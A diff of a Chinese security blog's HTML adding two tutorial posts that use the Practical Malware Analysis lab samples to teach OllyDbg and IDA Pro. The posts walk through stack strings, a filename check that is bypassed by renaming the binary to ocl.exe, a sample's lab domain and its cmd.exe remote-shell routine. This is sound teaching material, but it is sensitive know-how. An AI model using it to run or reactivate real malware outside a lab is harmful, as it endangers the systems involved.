+      <meta itemprop="description" content="喜欢逆向破解，漏洞挖掘、Web渗透，梦想着成为Mr. Robot">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Lee's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
           
+            <a href="/2021/08/12/MalwareAnalysis/5.OllyDebug/" class="post-title-link" itemprop="url">恶意代码分析实战五：OllyDebug动态结合</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-08-12 18:04:20" itemprop="dateCreated datePublished" datetime="2021-08-12T18:04:20+08:00">2021-08-12</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-08-16 19:03:47" itemprop="dateModified" datetime="2021-08-16T19:03:47+08:00">2021-08-16</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/PC%E9%80%86%E5%90%91/" itemprop="url" rel="index"><span itemprop="name">PC逆向</span></a>
+                </span>
+            </span>
+
           
-            
-          
-           
 
-这一节课，主要是利用OD对目标程序进行动态分析，从而学习OllyDebug的使用。
-123456789101112131415161718192021----------------Lab-09-02.exe----------------使用工具：1.小生我怕怕版OD2.Strings3.IDA Pro-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&
-        </a>
-      </p>
+        </div>
+      </header>
 
-      <div class="index-btm post-metas">
-        
-          <div class="post-meta mr-3">
-            <i class="iconfont icon-date"></i>
-            <time datetime="2021-08-12 18:04" pubdate>
-              2021-08-12
-            </time>
-          </div>
-        
-        
-          <div class="post-meta mr-3">
-            <i class="iconfont icon-category"></i>
-            
-              <a href="/categories/PC%E9%80%86%E5%90%91/">PC逆向</a>
-            
-          </div>
-        
-        
-          <div class="post-meta">
-            <i class="iconfont icon-tags"></i>
-            
-              <a href="/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97/">恶意代码分析系列</a>
-            
-          </div>
-        
-      </div>
-    </article>
-  </div>
-
-  <div class="row mx-auto index-card">
     
     
-    <article class="col-12 col-md-12 mx-auto index-info">
-      <h1 class="index-header">
-        
-        <a href="/2021/08/11/MalwareAnalysis/4.IDAPro/" target="_self">
-          恶意代码分析实战四：IDA Pro神器的使用
-        </a>
-      </h1>
+    
+    <div class="post-body" itemprop="articleBody">
 
-      <p class="index-excerpt">
-        <a href="/2021/08/11/MalwareAnalysis/4.IDAPro/" target="_self">
+      
+          <meta name="referrer" content="no-referrer"/> 
+
+<p>这一节课，主要是利用OD对目标程序进行动态分析，从而学习OllyDebug的使用。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">----------------</span><br><span class="line">Lab-09-02.exe</span><br><span class="line">----------------</span><br><span class="line"></span><br><span class="line">使用工具：</span><br><span class="line">1.小生我怕怕版OD</span><br><span class="line">2.Strings</span><br><span class="line">3.IDA Pro</span><br><span class="line"></span><br><span class="line">-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;</span><br><span class="line">1、在二进制文件中，你看到的静态字符串是什么？</span><br><span class="line">2、当你运行这个二进制文件时，会发生什么？</span><br><span class="line">3、怎样让恶意代码的攻击负载（payload）获得运行？</span><br><span class="line">-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;</span><br><span class="line"></span><br><span class="line">以下请读者看完文章后自行完成，相信你可以的。</span><br><span class="line">4、在地址0x00401133处发生了什么？</span><br><span class="line">5、传递给子例程（函数）0x00401089的参数是什么？</span><br><span class="line">6、恶意代码使用的域名是什么？</span><br><span class="line">7、恶意代码使用什么编码函数来混淆域名？</span><br><span class="line">8、恶意代码在0x0040106E处调用CreateProcessA函数的意义是什么？</span><br></pre></td></tr></table></figure>
+
+
+<p>其中1-2题大家利用已学的动静态分析基础技术来进行分析，这里就不再继续演示了</p>
+<p>首先我们用OD载入Lab-09-02.exe，然后在main函数入口出下断点，相信大家都应该都已经会了吧，如果还不会可以继续复习下，第四课：IDA Pro神器的使用。</p>
+<h2 id="OllyDebug界面介绍"><a href="#OllyDebug界面介绍" class="headerlink" title="OllyDebug界面介绍"></a>OllyDebug界面介绍</h2><p>首先OD 一共分4块界面，左上的这一块是反汇编视图，右上的这一块是寄存器视图，左下的这一块是内存视图，右下的这一块是堆栈视图。</p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816171955151-1274863806.png" alt="image-20210816171954060"> </p>
+<h2 id="OllyDebug载入程序方法"><a href="#OllyDebug载入程序方法" class="headerlink" title="OllyDebug载入程序方法"></a>OllyDebug载入程序方法</h2><p>我们载入<code>Lab-09-02.exe</code>，在OD菜单处点击<code>文件-&gt;打开-&gt;</code>然后选择恶意程序进行载入，也可以用快捷键F3来操作。</p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816172244712-1734096665.png" alt="image-20210816172244452"> </p>
+<h2 id="OllyDebug地址跳转"><a href="#OllyDebug地址跳转" class="headerlink" title="OllyDebug地址跳转"></a>OllyDebug地址跳转</h2><p>接着在反汇编视图处按快捷键<code>ctrl+g</code>调出跳转地址窗口，输入main函数入口点然后点击OK跳转过去。</p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816172456331-1340188303.png" alt="image-20210816172456001"> </p>
+<h2 id="OllyDebug下断点"><a href="#OllyDebug下断点" class="headerlink" title="OllyDebug下断点"></a>OllyDebug下断点</h2><p>跳转过来后按F2下一个断点，然后按F9运行程序，F9运行后程序断下了我们断点的位置，可以根据<code>EIP寄存器</code>，用来保存<code>当前CPU即将执行指令的地址</code>，总之可以根据eip指针来看程序现在执行到哪里了。</p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816172612264-843929760.png" alt="image-20210816172612021"> </p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816173104893-220076812.png" alt="image-20210816173104447"> </p>
+<p>首先我们来看看标红处，可以看到这里有一堆的mov指令，将字节送入栈空间。</p>
+<p>这里我们注意观察可以看到他有两个0的地方，像是分成了两块，有点开发经验的同学可能就知道，其实这是字符串的结尾符，</p>
+<p>因为我们在定义一个字符串的时候一般在尾部系统都会自动的添加一个00用来代表这个字符串结束了，所以这里其实是将两个字符串放到了栈空间里面。</p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816173401288-1499219950.png" alt="image-20210816173400867"> </p>
+<h2 id="OllyDebug单步执行"><a href="#OllyDebug单步执行" class="headerlink" title="OllyDebug单步执行"></a>OllyDebug单步执行</h2><p>接着，我们来单步执行(F8)，这里讲下单步的命令，其中(F7单步步入)代表的意思是遇到Call后会跟进去，而(F8单步步过)遇到Call后不会跟进去会步过。</p>
+<p>我们按6次F8后执行到了00401133指令处，然后可以在堆栈信息处看到，当前堆栈空间里面存放的是’B’字符。</p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816173845693-525790708.png" alt="image-20210816173845325"> </p>
+<h2 id="OllyDebug查看内存窗口数据"><a href="#OllyDebug查看内存窗口数据" class="headerlink" title="OllyDebug查看内存窗口数据"></a>OllyDebug查看内存窗口数据</h2><p>接着我们在堆栈信息窗口处，鼠标右键-&gt;<code>数据窗口中跟随地址</code>，然后一直F8直到运行到了0这位置为止。</p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816174410496-1070421594.png" alt="image-20210816174410107"> </p>
+<p>可以看到内存窗口处，汇编指令写入栈空间处的地方生成了字符串。<code>1qaz2wsx3edc</code></p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816175037478-769423772.png" alt="image-20210816175037026"> </p>
+<p>第二处字符串也是采用通用的方法，可以看到字符串<code>ocl.exe</code></p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816175233934-44025855.png" alt="image-20210816175233640"> </p>
+<h2 id="OllyDebug分析函数"><a href="#OllyDebug分析函数" class="headerlink" title="OllyDebug分析函数"></a>OllyDebug分析函数</h2><p>我们一直F8运行到<code>GetModuleFileNameA</code>这一处，然后可以看到这里有3个push，之前我们讲IDA的时候说过，call 就是一个函数，而call上面挨着的push一般是函数的参数，所以这地方一共有3个参数，我们可以在堆栈窗口中看到参数的详细信息。</p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816175824053-1259896155.png" alt="image-20210816175823553"> </p>
+<p>然后我们可以看到第二个参数是一个buffer，而第三个参数是buffer的大小，我们在第二个参数处右键-&gt;数据窗口中跟随，接着看内存窗口。</p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816180059746-2002474689.png" alt="image-20210816180059423"> </p>
+<p>可以看到此时的buffer是空的，我们需要执行<code>GetModuleFileNameA</code>后看看buffer中的数据，这里透露下，其实这个api函数是获取当前程序的路径，而我这程序是在桌面运行的，所以buffer数据应该是桌面路径+程序名。</p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816180232818-1666540118.png" alt="image-20210816180232477"> </p>
+<p>当F8执行后，果然内存窗口中出现了当前的路径字符串。</p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816180505154-628834644.png" alt="image-20210816180504890">  </p>
+<h2 id="IDA和OllyDebug动态结合"><a href="#IDA和OllyDebug动态结合" class="headerlink" title="IDA和OllyDebug动态结合"></a>IDA和OllyDebug动态结合</h2><p>我们继续F8执行到<code>00401217</code>地址处，然后可以在堆栈窗口看到这个函数一共2个参数，而且第一个参数就是刚才得到的路径，第二个是一个字符<code>\</code>。由于在这里OD并没有给我们分析出来这个函数是干嘛的，所以我们需要借助IDA来分析这个函数的功能。</p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816181034512-1941473845.png" alt="image-20210816181034117"> </p>
+<p>在IDA中跳到对应的地址，然后可以看到这个函数<code>strrchr</code>，功能详见图2。</p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816181339623-839302031.png" alt="image-20210816181339319"> </p>
+<p>所以这个函数运行后应该是会返回第二个参数，最后一次出现在字符串中的位置。</p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816181538969-1539614856.png" alt="image-20210816181538745"> </p>
+<h2 id="OllyDebug载入符号表"><a href="#OllyDebug载入符号表" class="headerlink" title="OllyDebug载入符号表"></a>OllyDebug载入符号表</h2><p>那么这里为什么OD没有帮我们分析出这个函数是<code>strrchr</code>呢，其实原因是因为OD没有该程序的符号表，我们可以通过IDA中点击菜单中的<code>File-&gt;Produce file-&gt;Create MAP file...</code>然后勾选图2中的选项后导出map文件。</p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816182029171-1220600959.png" alt="image-20210816182028944"> </p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816182308294-1728232077.png" alt="image-20210816182307395"> </p>
+<p>然后在OD中点击菜单<code>插件-&gt;LoadMapEx-&gt;LoadMapEx</code>,然后选择我IDA生成的符号表文件后，可以看到在图2中看到原本OD没有显示的符号表中的函数，现在显示出来了。</p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816182540577-1013516452.png" alt="image-20210816182540252"> </p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816182736212-1109494447.png" alt="image-20210816182735826"> </p>
+<p>函数执行后，我们可以在eax中看他的返回值，他返回了程序的文件名。</p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816183000038-1155004373.png" alt="image-20210816182959593"> </p>
+<h2 id="OllyDebug得到答案"><a href="#OllyDebug得到答案" class="headerlink" title="OllyDebug得到答案"></a>OllyDebug得到答案</h2><p>然后我们继续f8执行到<code>strcmp</code>处，可以在堆栈窗口中看到两个字符串<code>ocl.exe</code>和<code>Lab09-02.exe</code>，那么到这里我们就大概明白了为什么程序运行后什么反应都没有，是因为他进行了程序名的判断，如果程序名不是ocl.exe那么程序运行后就是直接退出的，那么最后我们来验证下将程序文件名改为ocl.exe运行后看看会有什么效果。</p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816183249046-1534120844.png" alt="image-20210816183248742"> </p>
+<p>那么执行后呢，可以在Process Explorer中看到程序呢没有退出了而是正常的运行了。</p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816183635907-1615110617.png" alt="image-20210816183635662"> </p>
+<p>恶意程序创建的Handles</p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816183927424-1103472455.png" alt="image-20210816183927262"> </p>
+<p>恶意程序调用到的dll</p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816184011791-1429055405.png" alt="image-20210816184011597"> </p>
+<h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>这一节我们主要根据实验的例子学会了如何的使用OllyDebug这个工具</p>
+<ul>
+<li>了解了OD的界面（反汇编窗口、寄存器窗口、数据窗口、堆栈窗口）</li>
+<li>演示了OD如何载入程序(F3)</li>
+<li>OD如何进行地址的跳转(Ctrl+g)</li>
+<li>OD如何下断点(F2)</li>
+<li>OD如何单步步过(F8)</li>
+<li>OD如何单步步入(F7)</li>
+<li>OD查看内存数据窗口的方法</li>
+<li>OD分析函数，参数和返回值(参数在堆栈窗口，返回值在eax)</li>
+<li>IDA和OD动态结合分析</li>
+<li>OD加载IDA导出的符号表</li>
+<li>通过修改程序名来达到运行恶意程序的目的</li>
+</ul>
+<p>欢迎加入QQ群：一起研究逆向、PWN、WEB安全、物联网安全</p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816190030059-1584849828.png" alt="Pwn菜鸡学习小分队群聊二维码"> </p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://vxer-lee.github.io/2021/08/11/MalwareAnalysis/4.IDAPro/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="VxerLee">
+      <meta itemprop="description" content="喜欢逆向破解，漏洞挖掘、Web渗透，梦想着成为Mr. Robot">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Lee's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
           
+            <a href="/2021/08/11/MalwareAnalysis/4.IDAPro/" class="post-title-link" itemprop="url">恶意代码分析实战四：IDA Pro神器的使用</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-08-11 18:04:20" itemprop="dateCreated datePublished" datetime="2021-08-11T18:04:20+08:00">2021-08-11</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-08-16 19:03:42" itemprop="dateModified" datetime="2021-08-16T19:03:42+08:00">2021-08-16</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/PC%E9%80%86%E5%90%91/" itemprop="url" rel="index"><span itemprop="name">PC逆向</span></a>
+                </span>
+            </span>
+
           
-            
-          
-           
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <meta name="referrer" content="no-referrer"/> 
 这节课主要通过使用IDA Pro来进行静态高级分析
 ## 实验：
 
-123456789101112131415161718----------------Lab05-01.dll----------------使用工具：1. IDA Pro-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-
-        </a>
-      </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">----------------</span><br><span class="line">Lab05-01.dll</span><br><span class="line">----------------</span><br><span class="line"></span><br><span class="line">使用工具：</span><br><span class="line">1. IDA Pro</span><br><span class="line"></span><br><span class="line">-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;</span><br><span class="line">1、DllMain的地址是什么？</span><br><span class="line">2、使用Imports窗口并浏览到的gethostbyname，导入函数定位到什么地址？</span><br><span class="line">3、有多少函数调用了gethostbyname？</span><br><span class="line">4、将精力集中在位于0x10001757处的对gethostbyname的调用，你能找出哪个DNS请求将被触发吗？</span><br><span class="line">5、IDA Pro识别了在0x10001656处的子过程中的多少个局部变量？</span><br><span class="line">6、IDA Pro识别了在0x10001656处的子过程中的多少个参数？</span><br><span class="line">7、使用Strings窗口，来在反汇编中定位字符串\cmd.exe &#x2F;c 。它位于哪？</span><br><span class="line">8、在引用\cmd.exe &#x2F;c的代码所在的区域发生了什么？</span><br><span class="line">9、在同一的区域，在0x100101C8处，看起来好像是dword_1008E5C4是一个全局变量，它帮助决定走哪条路径。那恶意代码是如何设置dword_1008E5C4的呢？(提示：使用dword_1008E5C4的交叉引用。)</span><br><span class="line">-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;</span><br></pre></td></tr></table></figure>
 
-      <div class="index-btm post-metas">
-        
-          <div class="post-meta mr-3">
-            <i class="iconfont icon-date"></i>
-            <time datetime="2021-08-11 18:04" pubdate>
-              2021-08-11
-            </time>
-          </div>
-        
-        
-          <div class="post-meta mr-3">
-            <i class="iconfont icon-category"></i>
-            
-              <a href="/categories/PC%E9%80%86%E5%90%91/">PC逆向</a>
-            
-          </div>
-        
-        
-          <div class="post-meta">
-            <i class="iconfont icon-tags"></i>
-            
-              <a href="/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97/">恶意代码分析系列</a>
-            
-          </div>
-        
-      </div>
-    </article>
-  </div>
 
-  <div class="row mx-auto index-card">
+
+<h3 id="题目1：利用IDA-Pro分析dll的入口点并显示地址"><a href="#题目1：利用IDA-Pro分析dll的入口点并显示地址" class="headerlink" title="题目1：利用IDA Pro分析dll的入口点并显示地址"></a>题目1：利用IDA Pro分析dll的入口点并显示地址</h3><p>按照如下步骤打开IDA Pro并且加载dll文件进行分析。</p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816104445140-184611703.png" alt="image-20210816104447048"> </p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816104555816-947610536.png" alt="image-20210816104555256"> </p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816104633883-1055870137.png" alt="image-20210816104634494"> </p>
+<p>等待分析完毕后，IDA Pro自动的会显示出dll的入口点函数<code>dllmain</code>，如图。</p>
+<p>题目1让我们显示出dllmain函数的地址，这里有两种方法，第一种方法是直接按空格切换成文本视图，第二种方法是在设置中显示带地址的图形显示。<br><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816104744957-480242822.png" alt="image-20210816104746502"> </p>
+<h4 id="空格切换文本视图："><a href="#空格切换文本视图：" class="headerlink" title="空格切换文本视图："></a>空格切换文本视图：</h4><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816104959803-1794537836.png" alt="image-20210816105000976"> </p>
+<h4 id="带地址显示图形界面"><a href="#带地址显示图形界面" class="headerlink" title="带地址显示图形界面"></a>带地址显示图形界面</h4><p>点击菜单 Options-&gt;General…-&gt;勾上 Line prefixes (graph)</p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816105343930-845268980.png" alt="image-20210816105345486"> </p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816105413858-1436092045.png" alt="image-20210816105414962"> </p>
+<h3 id="题目2：IDA-Pro导入表窗口"><a href="#题目2：IDA-Pro导入表窗口" class="headerlink" title="题目2：IDA Pro导入表窗口"></a>题目2：IDA Pro导入表窗口</h3><p>在<code>Imports</code>窗口中按<code>ctrl+f</code>进行搜索输入<code>gethostbyname</code>，定位到gethostbyname后双击过去调到文本视图界面看到其地址。</p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816110306035-1827634251.png" alt="image-20210816110307586"> </p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816110607431-642110554.png" alt="image-20210816110608131"> </p>
+<h3 id="题目3：交叉应用，看多少处函数调用了"><a href="#题目3：交叉应用，看多少处函数调用了" class="headerlink" title="题目3：交叉应用，看多少处函数调用了"></a>题目3：交叉应用，看多少处函数调用了</h3><p>在<code>gethostbyname</code>处按<code>ctrl+x</code>调出<code>交叉引用</code>，能看到所有对gethostbyname处有调用读取写入等的所有地方。</p>
+<p>点击<code>Type</code>进行类型排序，然后我们仔细来看这里有两个Type，一个是<code>p</code>代表的是函数,<code>r</code>代表的是读取属性，</p>
+<p>所以这里一共有9个p，但是这9个p并不能代码是9个函数调用了，我们在仔细来看图2，其中他有很多地址重复的，所以我们按照地址来分一共可以分析出是4处函数调用了gethostbyname。</p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816111104186-499963902.png" alt="image-20210816111105632"> </p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816111303775-965161103.png" alt="image-20210816111304620"> </p>
+<h3 id="题目4：利用ctrl-g跳转地址"><a href="#题目4：利用ctrl-g跳转地址" class="headerlink" title="题目4：利用ctrl+g跳转地址"></a>题目4：利用ctrl+g跳转地址</h3><p>将精力集中在位于0x10001757处的对gethostbyname的调用，你能找出哪个DNS请求将被触发吗？</p>
+<p>首先我们用ctrl+c拷贝<code>0x10001757</code>这个地址，然后在IDA Pro文本视图或界面视图，按<code>g</code>按键，跳转到对应的地址处。</p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816112255949-145256771.png" alt="image-20210816112256669"> </p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816112340299-1431434786.png" alt="image-20210816112341517"> </p>
+<p>切换到界面视图，然后对题目4的问题进行分析：你能找出哪个DNS请求将被触发吗？，我们找找gethostbyname的参数，一般call的意思就是调用函数，这里call gethostbyname就是调用gethostbyname这个api函数，然后call上面挨着的push就是函数参数，可以看到这里就一个参数<code>push eax</code>，参数是eax，所以我们来看看是什么给eax进行了赋值，往上可以看到有一句<code>mov eax,off_10019040</code>，这种带off_或者dword_下划线后面加个地址的可能都是<code>全局变量</code>，在后面有个注释是IDA Pro自动加上的，他这里分析出来off_10019040是一个字符串<code>[This is RDO]pics.praticalmalwareanalys</code></p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816112955114-481820878.png" alt="image-20210816112956670"> </p>
+<p>我们也可以直接双击全局变量过去，跳到他的定义处，在图一中还有一句<code>add eax,0Dh</code>，意思是将eax字符串的指针指向从开头后0xD也就是后13处，那么正好是<code>pics.praticalmalwareanalys</code>这个域名被解析。（答案）</p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816113031607-2135903345.png" alt="image-20210816113033143"> </p>
+<h3 id="题目5：局部变量分析"><a href="#题目5：局部变量分析" class="headerlink" title="题目5：局部变量分析"></a>题目5：局部变量分析</h3><p>IDA Pro识别了在0x10001656处的子过程中的多少个局部变量？</p>
+<p>首先跳转到地址处，不再重复如何跳转。然后我们在汇编代码的上面可以看到这些东西，红色标记的地方，这些都是局部变量和参数，其中<code>带负号的</code>都是局部变量，这里一共有23个带负号的，也就是23个局部变量。</p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816114625959-184048211.png" alt="image-20210816114619883"> </p>
+<h3 id="题目6：函数参数分析"><a href="#题目6：函数参数分析" class="headerlink" title="题目6：函数参数分析"></a>题目6：函数参数分析</h3><p>IDA Pro识别了在0x10001656处的子过程中的多少个参数？</p>
+<p>看上面的图，其中<code>正数</code>的就是参数，这里只有一个参数<code>lpThreadParameter</code>，其实也可以看函数头注释那里，IDA Pro自动分析出了<code>DWORD __stdcall sub_10001656(LPVOID lpThreadParameter)</code>,可以看出是一个参数。</p>
+<h3 id="题目7：Strings字符串窗口"><a href="#题目7：Strings字符串窗口" class="headerlink" title="题目7：Strings字符串窗口"></a>题目7：Strings字符串窗口</h3><p>使用Strings窗口，来在反汇编中定位字符串\cmd.exe /c 。它位于哪？</p>
+<p>我们可以按<code>shift+f12</code>来打开字符串窗口，可以在菜单中点击<code>View-&gt;Open subviews-&gt;Strings</code>打开字符串窗口。</p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816115334023-746650587.png" alt="image-20210816115335485"> </p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816115421364-1346612923.png" alt="image-20210816115422773"> </p>
+<p>双击过去之后点击这个地方，然后在图2中可以看到是<code>0x100101D0</code>位置的反汇编<code>push offset aCmdExeC</code>处。</p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816115503148-600830893.png" alt="image-20210816115504628"> </p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816115755533-544225403.png" alt="image-20210816115756935"> </p>
+<h3 id="题目8：代码分析"><a href="#题目8：代码分析" class="headerlink" title="题目8：代码分析"></a>题目8：代码分析</h3><p>在引用\cmd.exe /c的代码所在的区域发生了什么？</p>
+<p>我们在<code>100101D0</code>地址处，按一下按键<code>F5</code>进入反编译<code>C++伪代码</code>进行代码分析。</p>
+<p>首先我们在函数开头的地方开始逐步分析，可以看到一些敏感的字符串，这里有个关键字<code>Remote Shell Session</code>，所以这个程序应该是一个恶意远程Shell程序。</p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816131036278-140707818.png" alt="image-20210816131035431"> </p>
